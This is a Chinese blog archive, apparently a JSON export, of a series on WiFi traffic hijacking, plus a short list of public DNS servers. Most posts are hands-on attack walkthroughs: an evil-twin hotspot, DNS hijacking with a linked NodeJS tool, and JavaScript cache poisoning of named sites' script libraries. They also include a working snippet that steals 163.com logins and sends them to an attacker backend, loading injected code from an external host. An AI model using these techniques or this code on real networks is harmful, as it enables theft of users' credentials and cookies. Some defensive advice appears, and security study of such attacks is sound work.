和『缓存投毒』配合出击 在流量劫持第二篇里提到『HTTP 缓存投毒』这一概念，只要流量暂时性的被劫持，都可导致缓存长期感染。但这种攻击有个前提，必须事先找到站点下较稳定的脚本资源，做投毒的对象。 传统登录 在传统的登录模式里，缓存投毒非常难以利用： HTTPS 资源显然无法被感染。 而使用 HTTPS 向下转型的方案，也会因为离开劫持环境，而无法访问中间人的 HTTP 版登陆页面，导致缓存失效；或者这个真实的 HTTP 版的登录页面根本就不接受你的本地缓存，直接重定向到正常的 HTTPS 页面。 因此只有在主页面上，修改链接地址，让用户跳转到钓鱼网站去登录，才能勉强利用。 浮层登录 制作一个精良的浮层登录框，需要不少的界面代码，所以经常引用 jQuery 这类通用脚本库。而这些脚本往往是长久不会修改的，因此是缓存投毒的绝好原料。 所以，浮层登录框的存在，让『缓存投毒』有了绝佳的用武之地。 再之前的文章 WiFi流量劫持 —— JS脚本缓存投毒，演示了如何利用 www.163.com 下的某个长缓存脚本进行投毒，最终利用网易的浮层登录框获取账号。尽管网易也使用 HTTPS 传输账号数据，但在流量攻击面前不堪一击。 尽管这种登录模式风险重重，但最近百度也升级成浮层登录框，并且还是所有产品。所以，我们再次尝试那套的古老方法，看看在如今是否仍能发起攻击。 我们选几个最常用的产品线，进行一次缓存扫描： 果然，每个产品线里都有长期未修改、并且缓存很久的脚本库。 接着开启我们的钓鱼热点，让前来连接的用户，访问任何一个页面都能中毒。 为了让钓鱼热点更隐蔽，这次我们不再使用路由器，而是利用报废的安卓手机（下一篇文章详细讲解如何实现）。 为了不影响附近办公，本文就不演示同名热点钓鱼了，所以随便取了个名字。 接着让『受害者』来连一下我们的热点： 之前正好开着网页，所以很快收到了 HTTP 请求。我们在任何网页里注入 XSS，进行缓存投毒。 （由于原理和之前讲一样，所以这里就省略步骤了） 然后重启电脑，连上正常的 WiFi（模拟用户回到安全的场合）。 打开 tiebai.baidu.com，一切正常。 开始登录了。。。 看看这种浮层登录框，能否躲避我们的从沉睡中唤起的 XSS 脚本： 奇迹依然发生！ 由于之前有过详细的原理讲解，因此这里就不再累述了。不过在实战中，缓存投毒+非安全页面登录框，是批量获取明文账号的最理想手段。 不可逆的记忆 如果现在再将登录模式换回传统的，还来得及吗？显然，为时已晚。 当网站第一次从传统登录，升级到浮层登录时，用户大多不会立即输入，而是『欣赏』下这个新版本的创意。确认不是病毒广告弹出的窗口，而是真的官方设计的，才开始登录。 当用户多次使用浮层登录框之后，慢慢也就接受了这种新模式。 即使未来，网站取消了浮层登录，黑客使用 XSS 创建一个类似的浮层，用户仍会毫不犹豫的输入账号。因为在他们的记忆里，官方就曾使用过，仍然对其保留着对其信任度。 安全性升级 既然这个过程是不可逆的，撤回传统模式意义也不大。事实上，使用浮层的用户体验还是不错的，对于不了解安全性的用户来说，还是喜欢华丽的界面。 要保留体验，又得考虑安全性，最好的解决方案就是将所有的页面都使用 HTTPS，将站点武装到牙齿，不留一丝安全缝隙。这也是未来网站的趋势。 原文:http://www.cnblogs.com/index-html/p/traffic-hijack-danger-dialog.html 流量劫持系列文章目录: 流量劫持系列1_流量劫持_常见方法_是如何产生的? 流量劫持系列2_流量劫持能有多大危害? 流量劫持系列3_WiFi流量劫持_把笔记本改造成无线路由器_手机抓包 流量劫持系列4_WiFi流量劫持_浏览任意页面即可中毒！ 流量劫持系列5_WiFi流量劫持_JS脚本缓存投毒 流量劫持系列6_浮层登录框的隐患 流量劫持系列7_SSLStrip 的未来_HTTPS 前端劫持 流量劫持系列8_SSLStrip终极版_location瞒天过海 流量劫持系列9_沉默中的狂怒_Cookie 大喷发 流量劫持系列10_躲避HSTS的HTTPS劫持 流量劫持系列11_浅谈网站流量劫持防范措施","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"混技能","slug":"混技能","permalink":"https://sobaigu.com/tags/%E6%B7%B7%E6%8A%80%E8%83%BD/"}]},{"title":" 混技能流量劫持系列5_WiFi流量劫持_JS脚本缓存投毒","slug":"traffic-hijack-wifi-js","date":"2015-05-14T13:03:00.000Z","updated":"2024-09-28T00:17:21.256Z","comments":true,"path":"traffic-hijack-wifi-js.html","permalink":"https://sobaigu.com/traffic-hijack-wifi-js.html","excerpt":"在上一篇流量劫持系列4_WiFi流量劫持_浏览任意页面即可中毒！构思了一个时光机原型，让我们的脚本通过HTTP缓存机制，在未来的某个时刻被执行，因此我们可以实现超大范围的入侵了。 基于此原理，我们用NodeJS来实现一个简单的样例。得益于node强大的IO管理，以及各种封装好的网络模块，我们可以很容易实现这个想法：","text":"在上一篇流量劫持系列4_WiFi流量劫持_浏览任意页面即可中毒！构思了一个时光机原型，让我们的脚本通过HTTP缓存机制，在未来的某个时刻被执行，因此我们可以实现超大范围的入侵了。 基于此原理，我们用NodeJS来实现一个简单的样例。得益于node强大的IO管理，以及各种封装好的网络模块，我们可以很容易实现这个想法： 开启一个特殊的DNS服务：所有域名都解析到我们的电脑上。并把Wifi的DHCP-DNS设置为我们的电脑IP。 之后连上Wifi的用户打开任何网站，请求都将被我们的node服务收到。我们根据http头中的host字段来转发到真正服务器上。 收到服务器返回的数据之后，我们就可以实现网页脚本的注入，并返回给用户了！ 当注入的脚本被执行，用户的浏览器将依次预加载各大网站的常用脚本库。我们将其感染，并设置超长的缓存时间。 于是大功告成！ 为了方便测试和控制，已把整个流程：DNS、HTTP代理、代码分析和注入都使用NodeJS编写，并整合在一起。下面就来测试一下！ 获取Demo: （https://github.com/EtherDream/closurether） 当然，192.168.1.250这是我本地的IP，推荐使用固定的IP地址。 打开无线路由器-DHCP配置，将主DNS设置为自己的IP，重启路由。到此，你已经控制了整个无线网络的流量了！ 用另一台电脑连上你的wifi： 这时会发现，ping任何域名，不出意外的话都会返回你的IP，DNS劫持已发挥作用了！ 1234567$ ping www.baidu.comPING www.baidu.com (192.168.1.250): 56 data bytesRequest timeout for icmp_seq 0$ ping www.google.comPING www.google.com (192.168.1.250): 56 data bytesRequest timeout for icmp_seq 0 打开任意网页，一切正常。我们可以在node控制台看到用户访问的每一个请求。 当然这时网页上什么效果也没出现。这个Demo毕竟是个间谍程序，怎么可能会有界面呢？ 想看效果的话修改项目里的asset/inject/extern.js，往里面加一条： 1alert(&#x27;Hello World&#x27;); 这时再刷新页面，效果出现了！ 打开任意网页的源文件，发现其中都注入了我们的脚本内容。为了隐蔽性，这里将注入的脚本伪装成运营商的url，别人还以为是联通宽带插的广告 ^_^ 具体想伪装成什么地址，可以在config.json里配置。 脚本内容正是asset/inject/extern.js文件： 到此，我们已实现把javascript代码注入到WiFi网络的HTTP流量里了！ 下面测试我们的终极目标：能穿越到未来执行的脚本时光机。 前面仔细观察的话，不难发现注入的脚本内容里多出一大堆url，这些正是我们需要让用户预加载并缓存的各大网站脚本。具体原理在上一篇里已经详细讲解了。 如果想入侵更多的网站，往tool/cache-sniffer/url.txt里添加。运行$ phantomjs sniffer.js程序将自动更新注入脚本的内容。 要想预加载并缓存一个脚本很容易，只需new Image().src=‘…’。当然有少数浏览器不支持，不过ie和chrome都是支持的。尽管js文件并不是一个图片，但仍然会缓存。 上一篇文章已说明，为了减少一次请求大量脚本文件消耗的带宽，我们并不返回真正的原始脚本文件，而是一个很小的“桩文件”，用来启动我们的入侵代码，以及恢复原始脚本文件。 因此这个“桩文件”代码量非常少，区区百来字节而已。例如hao123网站下的某个已被感染了的脚本： 我们创建两个script元素，来加载外网的入侵代码，以及恢复原始脚本代码，使网页能正常运行。注意：原始脚本url后面的?1必不可少，否则又会从缓存里加载被感染的当前脚本，进入死循环。 ** 使用document.write的好处在于，它创建的脚本是异步加载顺序执行的。**所以在原始脚本未加载完之前，后面的脚本不会执行，避免了未定义错误的发生。 入侵代码的url可以在config.json里hacker_url字段配置。为了保证未来被感染的脚本被唤醒时，能正常调出你的入侵代码，所以选择一个可靠的外网来存放。 本Demo演示如何入侵并截获网易首页的账号，可以参考代码：http://jslog.sinaapp.com/ad.js。 演示中的代码很简单，仅仅捕捉用户在网易首页上输入的账号和密码而已，然后传给后台保存到数据库里。 1234567891011121314151617var url = location.href; if (/\\.163\\.com/i.test(url)) &#123; function onSubmit() &#123; post( NTES.one(&#x27;#js_loginframe_username&#x27;).value, NTES.one(&#x27;input[type=password]&#x27;).value ); &#125; NTES.one(&#x27;.ntes-loginframe-btn&#x27;).addEventListener(&#x27;click&#x27;, onSubmit); NTES.one(&#x27;input[type=password]&#x27;).addEventListener(&#x27;keydown&#x27;, function(e) &#123; if (e.keyCode == 13) &#123; onSubmit(); &#125; &#125;); &#125; 下面重启电脑，并连上家里的WiFi。（连过KFC的用户回家之后的情况） 这时用户的流量已完全不在我们的可控之中，看我们的脚本是否仍能从沉睡之中唤醒呢？ ** ** 打开www.163.com，一切正常~ 输入用户名密码，一切正常~ 似乎并没有感觉到任何的异常。回到我们自己的电脑上来看看，后台的笼子里是否有猎物捕捉到。。。 很好，我们的入侵代码已成功执行，在用户离开了我们的网络之后依旧能够运行！只要登录了我们事先感染过的那些网站，入侵代码都将会被唤醒。 事实上，只要用户不清空缓存，这段代码终将附着在硬盘缓存里，直到过期。有可能是1个星期，甚至数月的时间。 所谓一时失足成千古恨莫过于此。一时大意连接了一个wifi热点，不经意间间谍已潜入你的浏览器缓存里。。。 使用NodeJS，我们只需数百行代码就实现了这个想法。当然，简单的同时缺点也是不言而喻的。node只提供了传输层的网络接口，我们无法操作底层网络数据。所以只能使用DNS劫持的方法来获得用户的流量。因此也就产生了一个非常纠结的问题： 怎样才能确定用户查询的域名是HTTP主机呢？ 由于我们把所有的域名都解析到了自己的电脑上，因此包括其他的网络程序数据也转发到了我们这里。然而我们的node只监听了tcp:80端口，对于其他的端口则是完全忽略的。 即使我们监听了其他端口，我们也无法把收到的数据转发到真实的服务器 —— 我们根本不知道发到哪个地址上！ HTTP之所以能实现转发，得益于头部有个host字段；而非HTTP协议，甚至包括HTTPS，我们只能收到一堆二进制数据，然后就不知道的该交给谁了。 此问题虽然无法避免，但也有一定程度的解决方案： 1.) 事先收集各大网站的域名。之后用户查询的域名在列表里的话，直接返回自己的电脑IP；否则转发给外网DNS。 当记录足够多的话，我们可以拦截住用户大多数的网站流量。 但要收集大量的网站域名并不容易，而且仍会有不少的遗漏。因此我们使用更简单的方法： 2.) 仍然将所有的域名解析到自己电脑上，但域名TTL时间很短，几秒后就过期。 如果在之后的几秒时间里，收到访问这个域名的http请求（host字段是这个域名），那么就认为这个域名是http服务的； 如果规定时间里没有收到，那么就当做非http服务的域名。当域名ttl过期后，下次再查询这个域名时，就解析到外网真实的服务器IP了。反正不是http协议，收到了也没用。 3.) 尝试访问前来请求域名的80端口。如果能连接上，就当做是一个Web域名。就返回自己的IP。 目前使用方法3来识别域名。事实上基于DNS的流量劫持还有更大缺陷： 如果用户手工设置的DNS怎么办？比如8.8.8.8的用户就非常多。 不是80端口的网站又如何是好？难道我们要把1~65535的端口都监听吗？ 一个网站域名下同时有http和其他服务了，拦截就导致那个服务不可用了。 最麻烦的当属纯IP的网站，那么就完全无法拦截了~ 纠结之处就不再吐槽，不然就永远实现不了我们的想法了，以后再使用node扩展慢慢完善。 即便面临着不少问题，我们的Demo仍能顺利跑起来 —— 完全按照我们的预想运行！ 当然，你在想这招也只能获取普通的账号而已，对于https加密的账号就无能为力了。 的确如此，不过别忘了https网站是如何登陆的呢？是用户在地址栏一个字符一个字符的敲入https...然后回车吗？ 下一篇将演示如何把javascript注入到支付宝网页，并截获用户的账号和密码。 原文:http://www.cnblogs.com/index-html/p/wifi_hijack_3.html 流量劫持系列文章目录: 流量劫持系列1_流量劫持_常见方法_是如何产生的? 流量劫持系列2_流量劫持能有多大危害? 流量劫持系列3_WiFi流量劫持_把笔记本改造成无线路由器_手机抓包 流量劫持系列4_WiFi流量劫持_浏览任意页面即可中毒！ 流量劫持系列5_WiFi流量劫持_JS脚本缓存投毒 流量劫持系列6_浮层登录框的隐患 流量劫持系列7_SSLStrip 的未来_HTTPS 前端劫持 流量劫持系列8_SSLStrip终极版_location瞒天过海 流量劫持系列9_沉默中的狂怒_Cookie 大喷发 流量劫持系列10_躲避HSTS的HTTPS劫持 流量劫持系列11_浅谈网站流量劫持防范措施","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[]},{"title":"流量劫持系列4_WiFi流量劫持_浏览任意页面即可中毒！","slug":"traffic-hijack-in-everypage","date":"2015-05-07T06:03:12.000Z","updated":"2024-09-28T00:17:21.256Z","comments":true,"path":"traffic-hijack-in-everypage.html","permalink":"https://sobaigu.com/traffic-hijack-in-everypage.html","excerpt":"","text":"大家都知道公共场所的Wifi安全性很差，但并不清楚究竟有多差。大多以为只要不上QQ、不登陆网站账号就没事了，看看新闻小说什么的应该毫无关系。 的确如此，看看新闻网页没有涉及任何敏感的账号信息。即便是数据明文传输，Hacker也只能嗅探到你看了哪些新闻，这些毫无价值的信息。 不过如此守株待兔的嗅探，似乎也太被动了。既然我们能主动控制流量，何必用这种弱爆了的方法呢？ 在上一篇文章把笔记本改造成无线路由器_手机抓包里提到如何实现Wifi的流量拦截，并做出更大范围的攻击。 今天，我们使用一种古老的技术，打造一个巧妙的时光机原型，让我们的脚本能穿越到未来运行。即便今天只看了几个小说网页，也能在未来几天甚至几星期后，打开其他网站时释放我们的代码。 让入侵不再受时间与空间的限制，实现超长诅咒！ （全图链接：http://images.cnitblog.com/blog/273626/201306/26213334-97186026e3b948db928704244c6cb830.png） 原理 原理其实非常简单，相信大家看完图就明白了。 1. 当有人连上我们创建的AP时，他的命运已掌控在我们手中了！ 2~5. 他访问任何网站，我们的Web代理就能在其中插入一段脚本代码了。当然这不是一般的广告的代码，而是预加载各大网站所用到的脚本文件。 6~7. 一切都在我们掌控之中，我们并非返回真正的脚本库文件。事实上一次预加载那么多文件，很是浪费带宽~ 我们只返回一个很小的“桩文件”，让他在未来打开网页时再加载真正的文件。此外，这个“桩文件”里我们还可以额外加些其他脚本:) 由于这些脚本库通常有着很长的缓存时间，因此只要在用户在清空缓存之前，始终从本地缓存里读取这个文件！ 8~12. 即使用户离开了公共场所，但常用的脚本文件都已被感染并缓存。只要未来某一天登陆我们预先感染的网站，脚本将穿越时空被唤醒！ 由此看来，只要实现了第1步，之后的几乎都是顺理成章了！ 不过并非所用的人都是小白，还是有不少警惕性高的用户，不会轻易连接没有密码的公开wifi。事实上很多餐厅咖啡店的wifi都是设置了公开的密码的。 对于这种情况，我们就需要一个功率更大的AP了，并且将SSID与密码设置的和咖啡店的完全一致 —— 根据wifi的连接策略，同样的热点名将会优先选择信号更好的。如果密码也一样，他们就能顺利的连上我们的AP。于是我们的热点就像磁金石一样，将新来的用户统统吸过来，于是可以尽情的掌控了~~~ 不过最终的难点却不在此，要找出每个网站缓存最久的脚本资源才是重中之重。 事实上，光看缓存时间是远远不够的 —— 有不少文件设置了很久的缓存，但是他们却经常的更新。最常见的就是带时间戳或哈希值的脚本URL，他们几乎三两天换一个，却有很长的缓存时间，这显然是不可取的。因此，我们需要根据资源的缓存时间和上次修改时间，来衡量其稳定程度。 为了能方便从各大网站寻找稳定度较高的资源，我们使用PhantomJS来实现自动化分析。PhantomJS是没有界面的命令行Webkit浏览器，使用它来模拟网站的访问，能为我们节省大量的系统资源。 我们监听page.onResourceReceived事件，即可获取所有资源请求的回应数据。之前已提到，缓存时间是必要条件，修改时间是充分条件。修改时间早说明这个资源不经常改变，可以放心用！ 首先我们过滤掉缓存很短的资源，很快就过期的资源是没有利用价值的。然后按上修改时间的先后排序，最终为每个站点选择稳定度最优的几个资源。 代码实现 代码实现很简单： https://raw.github.com/EtherDream/closurether/master/tool/cache-sniffer/sniffer.js 测试常用的大网站 我们测试几个常用的大网站（url.txt）： 根据返回的数据来看（-几天没修改 / +缓存几天），每个站点下都有不少很久没有修改的脚本文件。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758E:\\NodeJS\\closurether\\tool\\cache-sniffer&gt;phantomjs sniffer.js== www.hao123.com ====================-2 / +360 http://s0.hao123img.com/res/js/track.js?381633== www.taobao.com ====================-497 / +3650 http://a.tbcdn.cn/apps/med/other/p4p/p4p_show_link.js?rd=20120305.js-229 / +3650 http://a.tbcdn.cn/apps/matrix-mission/feedback/feedback.js-178 / +3650 http://a.tbcdn.cn/s/kissy/gallery/??offline/1.0/index-min.js?t=20130701201313== www.renren.com ====================-631 / +365 http://s.xnimg.cn/a12023/jspro/beacon.js-491 / +365 http://s.xnimg.cn/n/apps/photo/modules/seed/photoSeed.js?r=1373879537560-454 / +365 http://s.xnimg.cn/a36267/js/register/register-xn6207-v6.js== www.kaixin001.com ====================-737 / +365 http://s.kaixin001.com.cn/js/core/ScrollObserver-000179b73.js-732 / +365 http://s.kaixin001.com.cn/js/core/Geometry-0001de487.js-715 / +365 http://s.kaixin001.com.cn/js/core/cookie/Cookie-0001f6c85.js== tieba.baidu.com ====================-40 / +30 http://static.tieba.baidu.com/tb/pms/wpo.pda.js?v=2.8-20 / +3600 http://img.baidu.com/hunter/tiebamonkey.min.20130625.js-18 / +30 http://tb1.bdstatic.com/tb/static-common/js/tb_ui_ac13f64f.js== weibo.com ====================-40 / +15 http://js.t.sinajs.cn/t5/register/js/page/login/index.js?version=201307151712== map.baidu.com ====================-238 / +3600 http://img.baidu.com/hunter/map.js?st=-15902-53 / +365 http://webmap1.map.bdimg.com/monitor/pdc_jfjmuk.js-5 / +365 http://webmap1.map.bdimg.com/initmap_gn34ay.js== www.tianya.cn ====================-12 / +30 http://static.tianyaui.com/global/ty/TY.js== user.qzone.qq.com ====================-7 / +7 http://imgcache.qq.com/ptlogin/ver/10034/js/h_login_11.js?max_age=604800&amp;amp;ptui_identifier=000E0133918D62675822E216CC1D89FE3A9C1A8B432218E564A3DD6F0B== www.163.com ====================-716 / +7 http://l.bst.126.net/rsc/js/jquery-1.6.2.min.js-297 / +90 http://img2.126.net/ntesrich/auto/adbox/adbox-v1.1.2-120705.js-83 / +90 http://img2.126.net/ntesrich/auto/indexU/fcbox-index-v1.0.0-130422.js== www.sohu.com ====================-42 / +90 http://js.sohu.com/pv/pvclick1211071116.js-42 / +90 http://js.sohu.com/pv/spv1209061800.js== www.mop.com ====================-969 / +299 http://mopimg.cn/openjs/jquery-1.4.4.min.js-458 / +299 http://mopimg.cn/dc/tj.js-396 / +299 http://mopimg.cn/tj/dcq.js== bbs.tianya.cn ====================-301 / +30 http://static.tianyaui.com/global/ty/stat/stat_20080313.js?_=1373879558250-38 / +30 http://static.tianyaui.com/global/lite/js/lite-all.js?v=201306250800-27 / +30 http://static.tianyaui.com/global/lite/js/bbs/bbs.js?v=201306250800DONE! 很好，有了这些数据，就可实现我们计划了！ 下一篇将介绍使用NodeJS来打造这一计划。 原文:http://www.cnblogs.com/index-html/archive/2013/06/14/wifi_hijack_2.html 流量劫持系列文章目录: 流量劫持系列1_流量劫持_常见方法_是如何产生的? 流量劫持系列2_流量劫持能有多大危害? 流量劫持系列3_WiFi流量劫持_把笔记本改造成无线路由器_手机抓包 流量劫持系列4_WiFi流量劫持_浏览任意页面即可中毒！ 流量劫持系列5_WiFi流量劫持_JS脚本缓存投毒 流量劫持系列6_浮层登录框的隐患 流量劫持系列7_SSLStrip 的未来_HTTPS 前端劫持 流量劫持系列8_SSLStrip终极版_location瞒天过海 流量劫持系列9_沉默中的狂怒_Cookie 大喷发 流量劫持系列10_躲避HSTS的HTTPS劫持 流量劫持系列11_浅谈网站流量劫持防范措施","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"混技能","slug":"混技能","permalink":"https://sobaigu.com/tags/%E6%B7%B7%E6%8A%80%E8%83%BD/"}]},{"title":"流量劫持系列3_WiFi流量劫持_把笔记本改造成无线路由器_手机抓包","slug":"traffic-hijack-wifi-phone","date":"2015-05-01T13:33:43.000Z","updated":"2024-09-28T00:17:21.256Z","comments":true,"path":"traffic-hijack-wifi-phone.html","permalink":"https://sobaigu.com/traffic-hijack-wifi-phone.html","excerpt":"","text":"最近发现系统自带一个无线网卡驱动，可以用很简单命令创建一个无线网络接入点。有了这个免费虚拟的无线路由，我们可以尽情掌控手机的wifi数据了！抓包，嗅探，协议分析，流量劫持，代码注入。。。尽情发挥你想做的吧~ 先从最简单的起，嗅探手机数据包。 WIN7下创建虚拟接入点很简单，只需两行命令： 12netsh wlan set hostednetwork mode=allow ssid=APName key=passwordnetsh wlan start hostednetwork 保存为bat文件，用管理员模式运行，虚拟AP立即出现了！ 我们创建了个叫FBI的接入点，适配器重命名为Wifi。打开手机，已经可搜到此连接。输入密码验证成功，但一直显示获取IP中。。。 因为这只是创建了一个本地适配器，仅次而已。它并没有一个完整路由器所需的DHCP服务和NAT功能。不过系统已内置这一系列的功能，我们可以很容易的开启。 我们将具备外网访问能力的适配器，共享给Wifi。相比简单的桥接，Windows的连接共享提供了家用路由器的必备功能。 这时我们可以成功连上FBI，并且上网了。 大功告成！接着开始抓包。 使用大名鼎鼎的协议分析工具Wireshark，绑定192.168.137.1的适配器（Windows连接共享的固定IP）。开始嗅探。 因为iPad开着QQ等软件，瞬间抓到不少数据包。由于大多数通信的应用都是二进制加密通信的，因此破解难度不小。 所以今后我们只考虑明文通信的 —— 基于HTTP协议的Web应用正是我们重点对象。 在过滤器里输入http，重来一次。 这时我们成功抓到手机发送的HTTP请求发出的搜索内容。嗅探成功！ 当然，这次我们抓到的内容意义并不大，因为这是被动嗅探的，只有用户访问了什么我们才能得到什么。所以我们必须主动出击，让用户自动被我们所控制。 通过插入返回页面的JavaScript脚本，即可实现实现更大范围的数据入侵和嗅探。 在Wireshark里，我们发现iPad的大量DNS请求被发送到的本机上面。 和传统的DNS劫持一样，我们将希望劫持的域名解析到本地IP，将用户带到我们的反向Web服务器上。通过修改HTTP返回内容，我们可以注入更强大的攻击脚本，实现更大范围的入侵！ 原文:http://www.cnblogs.com/index-html/archive/2013/05/06/wifi_hijack_1.html 流量劫持系列文章目录: 流量劫持系列1_流量劫持_常见方法_是如何产生的? 流量劫持系列2_流量劫持能有多大危害? 流量劫持系列3_WiFi流量劫持_把笔记本改造成无线路由器_手机抓包 流量劫持系列4_WiFi流量劫持_浏览任意页面即可中毒！ 流量劫持系列5_WiFi流量劫持_JS脚本缓存投毒 流量劫持系列6_浮层登录框的隐患 流量劫持系列7_SSLStrip 的未来_HTTPS 前端劫持 流量劫持系列8_SSLStrip终极版_location瞒天过海 流量劫持系列9_沉默中的狂怒_Cookie 大喷发 流量劫持系列10_躲避HSTS的HTTPS劫持 流量劫持系列11_浅谈网站流量劫持防范措施","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"混技能","slug":"混技能","permalink":"https://sobaigu.com/tags/%E6%B7%B7%E6%8A%80%E8%83%BD/"}]},{"title":"互联网公共DNS列表","slug":"internet-public-DNS","date":"2015-04-29T01:20:38.000Z","updated":"2024-09-28T00:17:21.255Z","comments":true,"path":"internet-public-DNS.html","permalink":"https://sobaigu.com/internet-public-DNS.html","excerpt":"在天朝互联网环境，运营商该解析的不解析或故意解析错误，流量劫持或者附带广告等比比皆是。 现提供目前公共DNS的机构和DNS服务器一览，方便不时之需，具体选哪个自己看着办吧。","text":"在天朝互联网环境，运营商该解析的不解析或故意解析错误，流量劫持或者附带广告等比比皆是。 现提供目前公共DNS的机构和DNS服务器一览，方便不时之需，具体选哪个自己看着办吧。 知名 Google 128.8.8.88.8.4.4 DNSPOD 1119.29.29.29 阿里云 12223.5.5.5223.6.6.6 百度 1180.76.76.76 360 1234电信：101.226.4.6联通：123.125.81.6移动：101.226.4.6铁通：101.226.4.6 114 123114.114.114.114和114.114.115.115(公共版)114.114.114.119和114.114.115.119(反木马版)114.114.114.110和114.114.115.110(校园版或绿色版) 其他 OneDNS 12112.124.47.27114.215.126.16 DNS派 12101.226.4.6和218.30.118.6(电信)123.125.81.6和140.207.198.6(联通) CNNIC 121.2.4.8210.2.4.8","categories":[{"name":"攒知识","slug":"攒知识","permalink":"https://sobaigu.com/categories/%E6%94%92%E7%9F%A5%E8%AF%86/"}],"tags":[]},{"title":"流量劫持系列2_流量劫持能有多大危害?","slug":"traffic-hijack-harm","date":"2015-04-26T11:25:30.000Z","updated":"2024-09-28T00:17:21.255Z","comments":true,"path":"traffic-hijack-harm.html","permalink":"https://sobaigu.com/traffic-hijack-harm.html","excerpt":"","text":"上一篇文章，介绍了常见的流量劫持途径。然而无论用何种方式获得流量，只有加以利用才能发挥作用。 不同的劫持方式，获得的流量也有所差异。DNS 劫持，只能截获通过域名发起的流量，直接使用 IP 地址的通信则不受影响；CDN 入侵，只有浏览网页或下载时才有风险，其他场合则毫无问题；而网关被劫持，用户所有流量都难逃魔掌。 在本文中，我们通过技术原理，讲解如下问题： 为什么喜欢劫持网页？ 只浏览不登陆就没事吗？ 自动填写表单有风险吗？ 离开劫持环境还受影响吗？ 使用 HTTPS 能否避免劫持？ 流量劫持能否控制我电脑？ 为什么喜欢劫持网页？ 理论上说，劫持到用户的流量数据，也就获得相应程序的网络通信。但在现实中，数据并不代表真实内容。一些重要的网络程序，都是私有的二进制协议，以及各种加密方式。想通过流量来还原出用户的聊天信息、支付密码，几乎是不可能的。即使花费各种手段，破解出某个程序的通信协议，然而一旦程序升级改变了协议格式，或许就前功尽弃了。因此，很难找到种一劳永逸的客户端劫持方案。 然而，并非所有程序都是客户端的。一种新兴的应用模式 —— WebApp，发展是如此之快，以至于超越客户端之势。在如今这个讲究跨平台、体验好，并有云端支持的年代，WebApp 越来越火热。各种应用纷纷移植成网页版，一些甚至替代了客户端。同时，也造就了流量劫持前所未有的势头。 WebApp，其本质仍是普通的网页而已。尽管网页技术在近些年里有了很大的发展，各种新功能一再增加，但其底层协议始终没有太大的改进 —— HTTP，一种使用了 20 多年古老协议。 在 HTTP 里，一切都是明文传输的，流量在途中可随心所欲的被控制。传统程序事先已下至本地，运行时只有通信流量；而在线使用的 WebApp，流量里既有通信数据，又有程序的界面和代码，劫持简直轻而易举。 上一篇也提到，如果在户外没有 3G 信号的地方钓鱼，无法将获得的流量转发到外网。然而，使用网页这一切就迎刃而解。我们完全可以在自己的设备上搭建一个站点，留住用户发起离线攻击。对于那些连上 WiFi 能自动弹网页的设备，那就更容易入侵了。 因此，劫持网页流量成了各路黑客们的钟爱，一种可在任意网页发起 XSS 的入侵方式。 [](https://raw.githubusercontent.com/fex-team/fex-team.github.io/master/img/traffic-hijack-2/http-inject.png 下面，开始我们的攻防之旅。 只浏览不登陆就没事吗？ 每当砖家出来提醒时，总免不了这么一句：公共场合尽量不登录账号。于是，大家就认为只看网页不登陆就平安无事了。 如果是公共的电脑，那也就无所谓；否则，自己的一些账号可能就倒霉了。 在自己的设备上，大家都会记住各种账号的登录状态，反正只有自己用，也没什么大不了的。然而，在被劫持的网络里，一切皆有可能发生。即使浏览再平常不过的网页，或许一个悄无声息的间谍脚本已暗藏其中，正偷偷访问你那登录着的网页，操控起你的账号了。 听起来似乎很玄乎吧，砖家似乎也没说已登录的账号会怎么样。难道随便一个网页，就能让各种账号被控制吗？ 大家都知道，HTTP 是无状态的，不像传统协议有个『会话』之类的概念。各种账号的登录状态，只能依靠浏览器的 Cookie 来实现。因此，只要有了的 Cookie 也就获得了用户账号的使用权。 和传统 XSS 攻击不同，流量劫持可以得到任何通信数据，当然也包括那些受 HttpOnly 保护的 Cookie。攻击脚本只需对某个站点发起请求，黑客即可在中途劫持到传输的 Cookie 数据。如果同时发起众多站点，就能覆盖相当一部分目标了。 这种请求未必要真正访问一次页面，仅仅将 URL 作为图片加载，将目标站点的 Cookie 送出即可。 黑客得到 Cookie，即可在自己浏览器里还原出登录状态。尽管你确实没有登录操作，但那些已登录的却能出卖你。 防范措施：访问一些重要的网站，尽量不要记住登录状态，以免 Cookie 被泄露。不过，只要网站绑定了 Cookie 和 IP 段，这招的危害程度就大幅降低了，仅凭 HttpOnly 还是很不靠谱的。 自动填写表单有风险吗？ 使用上面的方法获得 Cookie，即使能控制账号，但其密码仍无法得知，随时都有可能失去控制权。 不过，一些用户有让浏览器自动保存密码的习惯。通过这点，我们是否能套出记住的密码来呢？ 分析下浏览器是如何自动填写页面表单的。其实很简单，浏览器发现页面 URL 和表单名匹配记录里的，就自动填上了。 要是在流量可控的网络里，剥离页面所有内容只剩表单，又会如何？ 保存着的密码仍能自动填上，并且可被脚本访问到！ 如果我们在用户访问的页面里，创建大量的隐藏框架页，即可尝试获取各种网站保存着的账号了。（如今 Chrome 框架页已经不会自动填写了。具体实现和浏览器有关）。 然而，即使框架页不自动填写，但主页面总得保留该功能吧。如果发现用户某个打开着的网页很久没有交互了，可悄悄跳转到如上那样的纯表单页，无论能否获取数据，都将继续跳转，一个接一个的尝试。。。直到用户切回窗口，再恢复到原先那个页面。 由于泄露的是明文的账号和密码，即使数量不多，也能通过社工获取到用户的更多信息，最终导致更严重的泄露。 防范措施：所以无论是 Cookie 记住登录，还是浏览器自动填表，重要的账号都应慎用。 浏览器的自动填表也应增加些安全策略，例如必须有用户的交互才开始填写，规定的时间里只能填有限次。 离开劫持环境还受影响吗？ 或许你在想，网络再怎么不安全，离开之后就应该没事了吧。 有时在公共场合赶上免费的 WiFi，打开网页看一会新闻，是常有的事。这么短的时间里能有多大的事。不过在入侵脚本面前，一小会和长久并没太大区别。机会只要出现了，无论多么短暂都能渗透。 